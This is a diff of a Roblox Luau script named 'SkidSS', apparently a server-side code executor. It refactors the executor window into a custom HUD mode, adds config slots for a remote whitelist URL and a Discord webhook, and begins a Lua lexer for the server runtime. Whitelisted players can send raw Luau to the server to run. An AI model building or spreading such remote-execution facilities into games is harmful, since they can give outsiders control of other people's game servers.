@@ -28,16 +28,11 @@ local SETTINGS = {
 	maxLoopIterations = 100000,
 	maxWaitSeconds = 30,
 }
+-- Live whitelist URL (your SkidSS page) and Discord webhook proxy URL. Studio
+-- fills these; both nil by default.
+local WHITELIST_URL = nil
+local WEBHOOK_URL = nil
 -- ===== END CONFIG =====
-
--- ===== CUSTOM RUNTIME (written by Studio; safe to overwrite) =====
-local CustomRuntime = {
-	onPlayerAdded = function(_player) end,
-	onPlayerRemoving = function(_player) end,
-	onRequestReceived = function(_player, _payload) return true end,
-	customActions = {},
-}
--- ===== END CUSTOM RUNTIME =====
 
 -- ===== CUSTOM INTERFACE (written by Studio; safe to overwrite) =====
 local CustomInterface = function() return {} end
@@ -47,18 +42,19 @@ local RunService = game:GetService("RunService")
 
 -- ===== SHARED MODULES (run on both sides) =====
 local SkidSS_Config = (function()
--- Shared, replicated settings. Clients can read this, so keep no secrets here.
-
 local Config = {}
 
 Config.Version = "0.1.0"
 Config.NetFolder = "SkidSS_Net"
 
--- Server-enforced limits for block scripts so they can never hang the game.
 Config.Limits = {
 	MaxSteps = 200000,
 	MaxLoopIterations = 100000,
 	MaxWaitSeconds = 30,
+
+	MaxLuaSteps = 10000000,
+	MaxLuaSeconds = 2,
+	MaxLuaDepth = 200,
 }
 
 Config.UI = {
@@ -77,8 +73,6 @@ return Config
 end)()
 
 local SkidSS_Util = (function()
--- Small shared helpers.
-
 local Util = {}
 
 local idCounter = 0
@@ -103,8 +97,6 @@ return Util
 end)()
 
 local SkidSS_Net = (function()
--- Remote object names, plus build (server) and get (client) helpers.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Config = SkidSS_Config
 
@@ -143,10 +135,6 @@ return Net
 end)()
 
 local SkidSS_BlocksDefs = (function()
--- Every block lives here. A def carries its shape (label/inputs/fields/bodies),
--- how it runs (eval for values, exec for statements), and how it compiles to Lua.
--- Add a block by calling register{}; the editor, interpreter and compiler pick it up automatically.
-
 local Util = SkidSS_Util
 
 local Defs = {}
@@ -232,8 +220,6 @@ local function targetFields()
 	}
 end
 
--- Values -------------------------------------------------------------------
-
 register({
 	id = "_literal", category = "Values", kind = "value", side = "both", hidden = true,
 	eval = function(node)
@@ -270,8 +256,6 @@ register({
 	end,
 })
 
--- Variables ----------------------------------------------------------------
-
 register({
 	id = "var_get", category = "Variables", kind = "value", side = "both",
 	label = "value of %name",
@@ -304,8 +288,6 @@ register({
 	end,
 })
 
--- Operators ----------------------------------------------------------------
-
 register({
 	id = "op_arith", category = "Operators", kind = "value", side = "both",
 	label = "%a %op %b",
@@ -333,8 +315,6 @@ register({
 	toLua = function(node, c) return "(tostring(" .. c.in_("a") .. ") .. tostring(" .. c.in_("b") .. "))" end,
 })
 
--- Output -------------------------------------------------------------------
-
 register({
 	id = "print", category = "Output", kind = "statement", side = "both",
 	label = "print %text",
@@ -350,8 +330,6 @@ register({
 	exec = function(node, ctx, state) state.api.warn(tostring(ctx.eval(node.inputs.text))) end,
 	toLua = function(node, c) return c.pad .. "warn(" .. c.in_("text") .. ")" end,
 })
-
--- Control ------------------------------------------------------------------
 
 register({
 	id = "wait", category = "Control", kind = "statement", side = "both",
@@ -430,8 +408,6 @@ register({
 		return c.pad .. "while " .. compareLua(node, c) .. " do\n" .. c.body("do") .. "\n" .. c.pad .. "end"
 	end,
 })
-
--- Players (server side) ----------------------------------------------------
 
 register({
 	id = "players_count", category = "Players", kind = "value", side = "server",
@@ -521,8 +497,6 @@ register({
 	end,
 })
 
--- Interface (client side, edits the executor window itself) -----------------
-
 register({
 	id = "ui_set_title", category = "Interface", kind = "statement", side = "client",
 	label = "set window title to %text",
@@ -597,10 +571,6 @@ return Defs
 end)()
 
 local SkidSS_BlocksInterpreter = (function()
--- Runs a block program (an array of statement nodes) against a host-supplied api.
--- A step budget makes it impossible for a block script to hang the game, and the
--- `allow` table lets the host reject blocks that aren't meant to run on its side.
-
 local Defs = SkidSS_BlocksDefs
 
 local Interpreter = {}
@@ -665,8 +635,6 @@ return Interpreter
 end)()
 
 local SkidSS_BlocksLua = (function()
--- Compiles a block program to readable Luau for the "View Lua" panel and export.
-
 local Defs = SkidSS_BlocksDefs
 
 local Lua = {}
@@ -743,9 +711,6 @@ end
 if RunService:IsClient() then
 -- ===== CLIENT (runs in the cloned script inside PlayerGui) =====
 local SkidSS_Client_Theme = (function()
--- UI construction helpers plus the live, mutable colour table the Interface
--- blocks recolour at runtime.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Config = SkidSS_Config
 
@@ -809,9 +774,6 @@ return Theme
 end)()
 
 local SkidSS_Client_Palette = (function()
--- The block picker. Lists every statement block allowed on this side, grouped by
--- category; clicking one asks the canvas to insert it.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Defs = SkidSS_BlocksDefs
 local Theme = SkidSS_Client_Theme
@@ -874,9 +836,6 @@ return Palette
 end)()
 
 local SkidSS_Client_BlockCanvas = (function()
--- Renders a block program as a stack of editable rows. Control blocks nest their
--- bodies inwards. A "selection" marks where the palette inserts the next block.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Defs = SkidSS_BlocksDefs
 local Theme = SkidSS_Client_Theme
@@ -1213,9 +1172,6 @@ return BlockCanvas
 end)()
 
 local SkidSS_Client_BlockTab = (function()
--- A block-editing tab: palette on the left, canvas on the right, plus Run and
--- View Lua. Reused for both the server "Blocks" tab and the client "Interface" tab.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Lua = SkidSS_BlocksLua
 local Theme = SkidSS_Client_Theme
@@ -1298,8 +1254,6 @@ return BlockTab
 end)()
 
 local SkidSS_Client_CodeTab = (function()
--- Raw Luau editor. Sends its text to the server to run with loadstring.
-
 local Theme = SkidSS_Client_Theme
 
 local CodeTab = {}
@@ -1361,11 +1315,6 @@ return CodeTab
 end)()
 
 local SkidSS_Client_Window = (function()
--- The executor window: title bar, tabs (Code / Blocks / Interface), output console
--- and quick-button bar. Window.mount(cfg) applies a config table (from Studio's
--- CustomInterface) before building, so colours / title / tabs / buttons are baked
--- in. Also exposes the api the in-game Interface tab uses to restyle it live.
-
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -1387,9 +1336,6 @@ local function normalizeAsset(value)
 	return value
 end
 
--- Builds one designer element (panel / label / button / image / codebox) from a
--- spec. Positions and sizes are scales (0..1) so the layout is screen-responsive.
--- env = { codeBoxes = {}, fireAction = fn(name), runCode = fn(source) }.
 local function buildElement(el, parent, env)
 	local class = el.type == "image" and "ImageLabel"
 		or el.type == "button" and "TextButton"
@@ -1421,6 +1367,16 @@ local function buildElement(el, parent, env)
 	if class == "ImageLabel" then
 		inst.Image = normalizeAsset(el.image)
 		if typeof(el.imageColor) == "Color3" then inst.ImageColor3 = el.imageColor end
+
+		local id = string.match(tostring(el.image or ""), "%d+")
+		if id then
+			task.spawn(function()
+				task.wait(2)
+				if inst.Parent and not inst.IsLoaded then
+					inst.Image = "rbxthumb://type=Asset&id=" .. id .. "&w=420&h=420"
+				end
+			end)
+		end
 	end
 
 	if class == "TextLabel" or class == "TextButton" or class == "TextBox" then
@@ -1488,13 +1444,21 @@ local function buildElement(el, parent, env)
 		elseif el.execute and env then
 			inst.MouseButton1Click:Connect(function()
 				local box = env.codeBoxes and env.codeBoxes[el.execute]
-				if box then env.runCode(box.Text) end
+
+				if not box and env.codeBoxes then
+					local only, count = nil, 0
+					for _, b in env.codeBoxes do only = b; count += 1 end
+					if count == 1 then box = only end
+				end
+				if box then
+					env.runCode(box.Text)
+				elseif env.notify then
+					env.notify("no code box to run")
+				end
 			end)
 		end
 	end
 
-	-- A draggable element moves the whole HUD group (e.g. a background panel
-	-- acting as a window you drag by its margins).
 	if el.draggable then
 		inst.Active = true
 		local dragging, dragStart, startPositions
@@ -1533,8 +1497,6 @@ end
 function Window.mount(cfg)
 	cfg = cfg or {}
 
-	-- Apply the theme overrides into the shared colour table before anything is
-	-- built, so every instance (including the tabs) picks them up.
 	if typeof(cfg.accent) == "Color3" then Theme.colors.accent = cfg.accent end
 	if typeof(cfg.background) == "Color3" then Theme.colors.background = cfg.background end
 	if typeof(cfg.panel) == "Color3" then Theme.colors.panel = cfg.panel end
@@ -1549,7 +1511,7 @@ function Window.mount(cfg)
 
 	local player = Players.LocalPlayer
 	local playerGui = player:WaitForChild("PlayerGui")
-	-- De-dupe: never build a second copy of the UI.
+
 	if playerGui:FindFirstChild("SkidSS") then return end
 
 	local executeRemote = Net.get(Net.Execute)
@@ -1562,156 +1524,18 @@ function Window.mount(cfg)
 	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 	gui.Parent = playerGui
 
-	local winW = math.max(420, tonumber(cfg.width) or 760)
-	local winH = math.max(300, tonumber(cfg.height) or 480)
-	-- The built-in executor window is hidden on join by default (toggle key opens
-	-- it), so a custom HUD isn't competing with a second window on screen.
-	local openOnJoin = cfg.openOnJoin == true
-	local root = Theme.create("Frame", {
-		Size = UDim2.fromOffset(winW, winH),
-		Position = UDim2.new(0.5, -winW / 2, 0.5, -winH / 2),
-		AnchorPoint = Vector2.new(0, 0),
-		BackgroundColor3 = Theme.colors.background,
-		BorderSizePixel = 0,
-		Active = true,
-		Visible = openOnJoin,
-		Parent = gui,
-	}, { Theme.corner(10) })
+	local useCustom = type(cfg.elements) == "table" and #cfg.elements > 0
 
-	-- Header / drag bar
-	local headerBar = Theme.create("Frame", {
-		Size = UDim2.new(1, 0, 0, 40),
-		BackgroundColor3 = Theme.colors.panel,
-		BorderSizePixel = 0,
-		Active = true,
-		Parent = root,
-	}, { Theme.corner(10) })
-
-	local accentStrip = Theme.create("Frame", {
-		Size = UDim2.new(1, 0, 0, 3),
-		Position = UDim2.new(0, 0, 1, -3),
-		BackgroundColor3 = Theme.colors.accent,
-		BorderSizePixel = 0,
-		Parent = headerBar,
-	})
-
-	local title = Theme.create("TextLabel", {
-		Size = UDim2.new(1, -120, 1, 0),
-		Position = UDim2.fromOffset(14, 0),
-		BackgroundTransparency = 1,
-		Text = type(cfg.title) == "string" and cfg.title or "SkidSS",
-		TextColor3 = Theme.colors.text,
-		Font = Enum.Font.GothamBold,
-		TextSize = 16,
-		TextXAlignment = Enum.TextXAlignment.Left,
-		Parent = headerBar,
-	})
-
-	Theme.create("TextLabel", {
-		Size = UDim2.fromOffset(60, 40),
-		Position = UDim2.new(1, -100, 0, 0),
-		BackgroundTransparency = 1,
-		Text = "v" .. Config.Version,
-		TextColor3 = Theme.colors.subText,
-		Font = Enum.Font.Gotham,
-		TextSize = 12,
-		TextXAlignment = Enum.TextXAlignment.Right,
-		Parent = headerBar,
-	})
-
-	local hide = Theme.create("TextButton", {
-		Size = UDim2.fromOffset(30, 24),
-		Position = UDim2.new(1, -36, 0, 8),
-		BackgroundColor3 = Theme.colors.panelAlt,
-		Text = "\u{2013}",
-		TextColor3 = Theme.colors.text,
-		Font = Enum.Font.GothamBold,
-		TextSize = 16,
-		Parent = headerBar,
-	}, { Theme.corner(6) })
-
-	-- Content + bottom regions
-	local content = Theme.create("Frame", {
-		Position = UDim2.fromOffset(12, 84),
-		Size = UDim2.new(1, -24, 1, -252),
-		BackgroundTransparency = 1,
-		ClipsDescendants = true,
-		Parent = root,
-	})
-
-	local console = Theme.create("ScrollingFrame", {
-		Position = UDim2.new(0, 12, 1, -160),
-		Size = UDim2.new(1, -24, 0, 110),
-		BackgroundColor3 = Theme.colors.panel,
-		BorderSizePixel = 0,
-		ScrollBarThickness = 5,
-		CanvasSize = UDim2.new(),
-		AutomaticCanvasSize = Enum.AutomaticSize.Y,
-		Parent = root,
-	}, { Theme.corner(8), Theme.padding(8) })
-	local consoleLayout = Theme.listLayout(2)
-	consoleLayout.Parent = console
-
-	local quickBar = Theme.create("Frame", {
-		Position = UDim2.new(0, 12, 1, -42),
-		Size = UDim2.new(1, -24, 0, 30),
-		BackgroundTransparency = 1,
-		Parent = root,
-	})
-	local quickRow = Theme.listLayout(6, Enum.FillDirection.Horizontal)
-	quickRow.Parent = quickBar
-
-	-- UI api used by the live console and by Interface blocks ------------------
 	local lineOrder = 0
 	local quickButtons = {}
-	local hudOutputs = {} -- append functions for any Output elements on the HUD
+	local hudOutputs = {}
+	local console, titleLabel, accentStrip, root, quickBar
 	local api = {}
-
-	function api.log(text)
-		for _, append in hudOutputs do
-			append(tostring(text))
-		end
-		lineOrder += 1
-		local label = Theme.create("TextLabel", {
-			Size = UDim2.new(1, 0, 0, 0),
-			AutomaticSize = Enum.AutomaticSize.Y,
-			BackgroundTransparency = 1,
-			Text = tostring(text),
-			TextColor3 = Theme.colors.text,
-			Font = Enum.Font.Code,
-			TextSize = 13,
-			TextXAlignment = Enum.TextXAlignment.Left,
-			TextWrapped = true,
-			LayoutOrder = lineOrder,
-			Parent = console,
-		})
-		task.defer(function()
-			console.CanvasPosition = Vector2.new(0, console.AbsoluteCanvasSize.Y)
-		end)
-		return label
-	end
-
-	function api.setTitle(text)
-		title.Text = text
-	end
-
-	function api.setAccent(color)
-		Theme.colors.accent = color
-		accentStrip.BackgroundColor3 = color
-		for _, button in quickButtons do
-			button.BackgroundColor3 = color
-		end
-	end
-
-	function api.setBackground(color)
-		Theme.colors.background = color
-		root.BackgroundColor3 = color
-	end
 
 	function api.notify(text)
 		local toast = Theme.create("TextLabel", {
-			Size = UDim2.fromOffset(260, 34),
-			Position = UDim2.new(0.5, -130, 0, 50),
+			Size = UDim2.fromOffset(280, 34),
+			Position = UDim2.new(0.5, -140, 0, 50),
 			BackgroundColor3 = Theme.colors.panelAlt,
 			Text = tostring(text),
 			TextColor3 = Theme.colors.text,
@@ -1724,7 +1548,52 @@ function Window.mount(cfg)
 		end)
 	end
 
-	-- ctx shared with the tabs
+	function api.log(text)
+		text = tostring(text)
+		for _, append in hudOutputs do
+			append(text)
+		end
+		if console then
+			lineOrder += 1
+			Theme.create("TextLabel", {
+				Size = UDim2.new(1, 0, 0, 0),
+				AutomaticSize = Enum.AutomaticSize.Y,
+				BackgroundTransparency = 1,
+				Text = text,
+				TextColor3 = Theme.colors.text,
+				Font = Enum.Font.Code,
+				TextSize = 13,
+				TextXAlignment = Enum.TextXAlignment.Left,
+				TextWrapped = true,
+				LayoutOrder = lineOrder,
+				Parent = console,
+			})
+			task.defer(function()
+				console.CanvasPosition = Vector2.new(0, console.AbsoluteCanvasSize.Y)
+			end)
+		elseif #hudOutputs == 0 then
+
+			api.notify(text)
+		end
+	end
+
+	function api.setTitle(text)
+		if titleLabel then titleLabel.Text = text end
+	end
+
+	function api.setAccent(color)
+		Theme.colors.accent = color
+		if accentStrip then accentStrip.BackgroundColor3 = color end
+		for _, button in quickButtons do
+			button.BackgroundColor3 = color
+		end
+	end
+
+	function api.setBackground(color)
+		Theme.colors.background = color
+		if root then root.BackgroundColor3 = color end
+	end
+
 	local state = { serverProgram = nil }
 	local ctx = {
 		log = api.log,
@@ -1735,9 +1604,8 @@ function Window.mount(cfg)
 		window = api,
 	}
 
-	-- addButton(label[, onClick]). Without onClick it re-runs the saved block
-	-- program; with one it does whatever the caller wants (e.g. fire an action).
 	function api.addButton(label, onClick)
+		if not quickBar then return end
 		local button = Theme.create("TextButton", {
 			Size = UDim2.fromOffset(110, 30),
 			BackgroundColor3 = Theme.colors.accent,
@@ -1758,150 +1626,257 @@ function Window.mount(cfg)
 		end)
 	end
 
-	-- The executor has a single Code tab.
-	local code = CodeTab.build(content, ctx)
-	code.frame.Visible = true
+	if useCustom then
 
-	-- Buttons baked in by Studio fire named runtime actions.
-	if type(cfg.buttons) == "table" then
-		for _, button in cfg.buttons do
-			if type(button) == "table" and type(button.label) == "string" then
-				local action = button.action
-				local args = button.args
-				if action then
-					api.addButton(button.label, function()
-						ctx.execute({ mode = "action", name = action, args = args })
-						api.log("> " .. button.label)
-					end)
-				else
-					api.addButton(button.label)
-				end
-			end
-		end
-	end
+		local hud = Theme.create("Frame", {
+			Name = "HUD",
+			Size = UDim2.fromScale(1, 1),
+			BackgroundColor3 = Theme.colors.background,
 
-	local tabBar = Theme.create("Frame", {
-		Position = UDim2.fromOffset(12, 48),
-		Size = UDim2.new(1, -24, 0, 30),
-		BackgroundTransparency = 1,
-		Parent = root,
-	})
-	local tabRow = Theme.listLayout(6, Enum.FillDirection.Horizontal)
-	tabRow.Parent = tabBar
+			BackgroundTransparency = tonumber(cfg.backgroundTransparency) or 1,
+			BorderSizePixel = 0,
+			Parent = gui,
+		})
 
-	Theme.create("TextButton", {
-		Size = UDim2.fromOffset(110, 30),
-		BackgroundColor3 = Theme.colors.accent,
-		Text = "Code",
-		TextColor3 = Theme.colors.text,
-		Font = Enum.Font.GothamMedium,
-		TextSize = 13,
-		Parent = tabBar,
-	}, { Theme.corner(6) })
-
-	-- Custom designer elements (always-visible HUD, sibling to the window)
-	if type(cfg.elements) == "table" then
 		local elementInsts = {}
 		local env = {
 			codeBoxes = {},
 			outputs = hudOutputs,
 			elementInsts = elementInsts,
+			notify = api.notify,
 			fireAction = function(action)
 				ctx.execute({ mode = "action", name = action })
 				api.log("> " .. tostring(action))
 			end,
 			runCode = function(source)
+				api.log("> running\u{2026}")
 				ctx.execute({ mode = "lua", source = source })
 			end,
 		}
 		for _, el in cfg.elements do
 			if type(el) == "table" then
-				table.insert(elementInsts, buildElement(el, gui, env))
+				table.insert(elementInsts, buildElement(el, hud, env))
 			end
+		end
+
+		UserInputService.InputBegan:Connect(function(input)
+			if input.KeyCode == toggleKey then
+				hud.Visible = not hud.Visible
+			end
+		end)
+	else
+
+		local winW = math.max(420, tonumber(cfg.width) or 760)
+		local winH = math.max(300, tonumber(cfg.height) or 480)
+		local openOnJoin = cfg.openOnJoin == true
+
+		root = Theme.create("Frame", {
+			Size = UDim2.fromOffset(winW, winH),
+			Position = UDim2.new(0.5, -winW / 2, 0.5, -winH / 2),
+			AnchorPoint = Vector2.new(0, 0),
+			BackgroundColor3 = Theme.colors.background,
+			BorderSizePixel = 0,
+			Active = true,
+			Visible = openOnJoin,
+			Parent = gui,
+		}, { Theme.corner(10) })
+
+		local headerBar = Theme.create("Frame", {
+			Size = UDim2.new(1, 0, 0, 40),
+			BackgroundColor3 = Theme.colors.panel,
+			BorderSizePixel = 0,
+			Active = true,
+			Parent = root,
+		}, { Theme.corner(10) })
+
+		accentStrip = Theme.create("Frame", {
+			Size = UDim2.new(1, 0, 0, 3),
+			Position = UDim2.new(0, 0, 1, -3),
+			BackgroundColor3 = Theme.colors.accent,
+			BorderSizePixel = 0,
+			Parent = headerBar,
+		})
+
+		titleLabel = Theme.create("TextLabel", {
+			Size = UDim2.new(1, -120, 1, 0),
+			Position = UDim2.fromOffset(14, 0),
+			BackgroundTransparency = 1,
+			Text = type(cfg.title) == "string" and cfg.title or "SkidSS",
+			TextColor3 = Theme.colors.text,
+			Font = Enum.Font.GothamBold,
+			TextSize = 16,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			Parent = headerBar,
+		})
+
+		Theme.create("TextLabel", {
+			Size = UDim2.fromOffset(60, 40),
+			Position = UDim2.new(1, -100, 0, 0),
+			BackgroundTransparency = 1,
+			Text = "v" .. Config.Version,
+			TextColor3 = Theme.colors.subText,
+			Font = Enum.Font.Gotham,
+			TextSize = 12,
+			TextXAlignment = Enum.TextXAlignment.Right,
+			Parent = headerBar,
+		})
+
+		local hide = Theme.create("TextButton", {
+			Size = UDim2.fromOffset(30, 24),
+			Position = UDim2.new(1, -36, 0, 8),
+			BackgroundColor3 = Theme.colors.panelAlt,
+			Text = "\u{2013}",
+			TextColor3 = Theme.colors.text,
+			Font = Enum.Font.GothamBold,
+			TextSize = 16,
+			Parent = headerBar,
+		}, { Theme.corner(6) })
+
+		local content = Theme.create("Frame", {
+			Position = UDim2.fromOffset(12, 84),
+			Size = UDim2.new(1, -24, 1, -252),
+			BackgroundTransparency = 1,
+			ClipsDescendants = true,
+			Parent = root,
+		})
+
+		console = Theme.create("ScrollingFrame", {
+			Position = UDim2.new(0, 12, 1, -160),
+			Size = UDim2.new(1, -24, 0, 110),
+			BackgroundColor3 = Theme.colors.panel,
+			BorderSizePixel = 0,
+			ScrollBarThickness = 5,
+			CanvasSize = UDim2.new(),
+			AutomaticCanvasSize = Enum.AutomaticSize.Y,
+			Parent = root,
+		}, { Theme.corner(8), Theme.padding(8) })
+		local consoleLayout = Theme.listLayout(2)
+		consoleLayout.Parent = console
+
+		quickBar = Theme.create("Frame", {
+			Position = UDim2.new(0, 12, 1, -42),
+			Size = UDim2.new(1, -24, 0, 30),
+			BackgroundTransparency = 1,
+			Parent = root,
+		})
+		local quickRow = Theme.listLayout(6, Enum.FillDirection.Horizontal)
+		quickRow.Parent = quickBar
+
+		local code = CodeTab.build(content, ctx)
+		code.frame.Visible = true
+
+		if type(cfg.buttons) == "table" then
+			for _, button in cfg.buttons do
+				if type(button) == "table" and type(button.label) == "string" then
+					local action = button.action
+					local args = button.args
+					if action then
+						api.addButton(button.label, function()
+							ctx.execute({ mode = "action", name = action, args = args })
+							api.log("> " .. button.label)
+						end)
+					else
+						api.addButton(button.label)
+					end
+				end
+			end
+		end
+
+		local tabBar = Theme.create("Frame", {
+			Position = UDim2.fromOffset(12, 48),
+			Size = UDim2.new(1, -24, 0, 30),
+			BackgroundTransparency = 1,
+			Parent = root,
+		})
+		local tabRow = Theme.listLayout(6, Enum.FillDirection.Horizontal)
+		tabRow.Parent = tabBar
+
+		Theme.create("TextButton", {
+			Size = UDim2.fromOffset(110, 30),
+			BackgroundColor3 = Theme.colors.accent,
+			Text = "Code",
+			TextColor3 = Theme.colors.text,
+			Font = Enum.Font.GothamMedium,
+			TextSize = 13,
+			Parent = tabBar,
+		}, { Theme.corner(6) })
+
+		hide.MouseButton1Click:Connect(function()
+			root.Visible = false
+		end)
+		UserInputService.InputBegan:Connect(function(input)
+			if input.KeyCode == toggleKey then
+				root.Visible = not root.Visible
+			end
+		end)
+
+		local dragging, dragStart, startPos
+		headerBar.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				dragging = true
+				dragStart = input.Position
+				startPos = root.Position
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragging = false
+					end
+				end)
+			end
+		end)
+		UserInputService.InputChanged:Connect(function(input)
+			if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+				local delta = input.Position - dragStart
+				root.Position = UDim2.new(
+					startPos.X.Scale, startPos.X.Offset + delta.X,
+					startPos.Y.Scale, startPos.Y.Offset + delta.Y
+				)
+			end
+		end)
+
+		local grip = Theme.create("TextButton", {
+			Size = UDim2.fromOffset(18, 18),
+			Position = UDim2.new(1, -22, 1, -22),
+			BackgroundColor3 = Theme.colors.panelAlt,
+			Text = "\u{2921}",
+			TextColor3 = Theme.colors.subText,
+			Font = Enum.Font.GothamBold,
+			TextSize = 14,
+			Active = true,
+			Parent = root,
+		}, { Theme.corner(4) })
+
+		local resizing, resizeStart, resizeStartSize
+		grip.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				resizing = true
+				resizeStart = input.Position
+				resizeStartSize = root.AbsoluteSize
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						resizing = false
+					end
+				end)
+			end
+		end)
+		UserInputService.InputChanged:Connect(function(input)
+			if resizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+				local delta = input.Position - resizeStart
+				root.Size = UDim2.fromOffset(
+					math.max(420, resizeStartSize.X + delta.X),
+					math.max(300, resizeStartSize.Y + delta.Y)
+				)
+			end
+		end)
+
+		if not openOnJoin then
+			api.notify("Press " .. toggleKey.Name .. " to open SkidSS")
 		end
 	end
 
-	-- Output from the server
 	outputRemote.OnClientEvent:Connect(function(text)
 		api.log(text)
 	end)
-	api.log("SkidSS ready. " .. toggleKey.Name .. " toggles this window.")
-	-- If nothing else is on screen (no custom HUD), tell the player how to open it.
-	if not openOnJoin and (type(cfg.elements) ~= "table" or #cfg.elements == 0) then
-		api.notify("Press " .. toggleKey.Name .. " to open SkidSS")
-	end
-
-	-- Hide / toggle
-	hide.MouseButton1Click:Connect(function()
-		root.Visible = false
-	end)
-	-- Toggle works even while a TextBox is focused (the key isn't a typing key).
-	UserInputService.InputBegan:Connect(function(input)
-		if input.KeyCode == toggleKey then
-			root.Visible = not root.Visible
-		end
-	end)
-
-	-- Dragging
-	local dragging, dragStart, startPos
-	headerBar.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			dragging = true
-			dragStart = input.Position
-			startPos = root.Position
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					dragging = false
-				end
-			end)
-		end
-	end)
-	UserInputService.InputChanged:Connect(function(input)
-		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-			local delta = input.Position - dragStart
-			root.Position = UDim2.new(
-				startPos.X.Scale, startPos.X.Offset + delta.X,
-				startPos.Y.Scale, startPos.Y.Offset + delta.Y
-			)
-		end
-	end)
-
-	-- Resize grip (bottom-right corner). The window's regions are anchored
-	-- relative to root, so changing root size reflows everything.
-	local grip = Theme.create("TextButton", {
-		Size = UDim2.fromOffset(18, 18),
-		Position = UDim2.new(1, -22, 1, -22),
-		BackgroundColor3 = Theme.colors.panelAlt,
-		Text = "\u{2921}",
-		TextColor3 = Theme.colors.subText,
-		Font = Enum.Font.GothamBold,
-		TextSize = 14,
-		Active = true,
-		Parent = root,
-	}, { Theme.corner(4) })
-
-	local resizing, resizeStart, resizeStartSize
-	grip.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			resizing = true
-			resizeStart = input.Position
-			resizeStartSize = root.AbsoluteSize
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					resizing = false
-				end
-			end)
-		end
-	end)
-	UserInputService.InputChanged:Connect(function(input)
-		if resizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-			local delta = input.Position - resizeStart
-			root.Size = UDim2.fromOffset(
-				math.max(420, resizeStartSize.X + delta.X),
-				math.max(300, resizeStartSize.Y + delta.Y)
-			)
-		end
-	end)
+	api.log("SkidSS ready \u{2014} " .. toggleKey.Name .. " toggles.")
 
 	return api
 end
@@ -1909,12 +1884,10 @@ end
 return Window
 end)()
 
--- Client entry point. Asks the server whether this player is whitelisted and
--- only then builds the executor window.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Net = SkidSS_Net
 
+local CustomInterface = function() return {} end
 
 local allowed = Net.get(Net.RequestAccess):InvokeServer()
 if not allowed then
@@ -1935,10 +1908,1319 @@ Window.mount(cfg)
 end
 
 -- ===== SERVER (do not edit) =====
-local SkidSS_ServerApi = (function()
--- The surface that server-run block programs are allowed to touch. emit() sends a
--- console line back to the player who ran the script.
+-- Server runtime: the default CustomRuntime table, then your Script-tab blocks
+-- (hooks + actions) which override it. Server-only — never runs on the client.
+-- ===== CUSTOM RUNTIME (written by Studio; safe to overwrite) =====
+local CustomRuntime = {
+	onPlayerAdded = function(_player) end,
+	onPlayerRemoving = function(_player) end,
+	onRequestReceived = function(_player, _payload) return true end,
+	customActions = {},
+}
+-- ===== END CUSTOM RUNTIME =====
 
+local SkidSS_LuaLexer = (function()
+local Lexer = {}
+
+local KEYWORDS = {
+	["and"] = true, ["break"] = true, ["do"] = true, ["else"] = true,
+	["elseif"] = true, ["end"] = true, ["false"] = true, ["for"] = true,
+	["function"] = true, ["if"] = true, ["in"] = true, ["local"] = true,
+	["nil"] = true, ["not"] = true, ["or"] = true, ["repeat"] = true,
+	["return"] = true, ["then"] = true, ["true"] = true, ["until"] = true,
+	["while"] = true,
+}
+
+local SYM3 = { ["..."] = true, ["//="] = true, ["..="] = true }
+local SYM2 = {
+	[".."] = true, ["=="] = true, ["~="] = true, ["<="] = true, [">="] = true,
+	["//"] = true, ["::"] = true, ["->"] = true, ["+="] = true, ["-="] = true,
+	["*="] = true, ["/="] = true, ["%="] = true, ["^="] = true,
+}
+local SYM1 = {
+	["+"] = true, ["-"] = true, ["*"] = true, ["/"] = true, ["%"] = true,
+	["^"] = true, ["#"] = true, ["<"] = true, [">"] = true, ["="] = true,
+	["("] = true, [")"] = true, ["{"] = true, ["}"] = true, ["["] = true,
+	["]"] = true, [";"] = true, [":"] = true, [","] = true, ["."] = true,
+	["?"] = true, ["|"] = true, ["&"] = true,
+}
+
+local ESCAPES = {
+	["n"] = "\n", ["t"] = "\t", ["r"] = "\r", ["a"] = "\a", ["b"] = "\b",
+	["f"] = "\f", ["v"] = "\v", ["\\"] = "\\", ['"'] = '"', ["'"] = "'",
+	["\n"] = "\n",
+}
+
+local function isDigit(c) return c >= "0" and c <= "9" end
+local function isHex(c)
+	return (c >= "0" and c <= "9") or (c >= "a" and c <= "f") or (c >= "A" and c <= "F")
+end
+local function isAlpha(c)
+	return c == "_" or (c >= "a" and c <= "z") or (c >= "A" and c <= "Z")
+end
+local function isAlphaNum(c) return isAlpha(c) or isDigit(c) end
+
+function Lexer.tokenize(src)
+	local tokens = {}
+	local i = 1
+	local n = #src
+	local line = 1
+
+	local function err(msg)
+		error({ __skidss_lex = true, message = "input:" .. line .. ": " .. msg }, 0)
+	end
+	local function at(k) return string.sub(src, k, k) end
+
+	local function readLong()
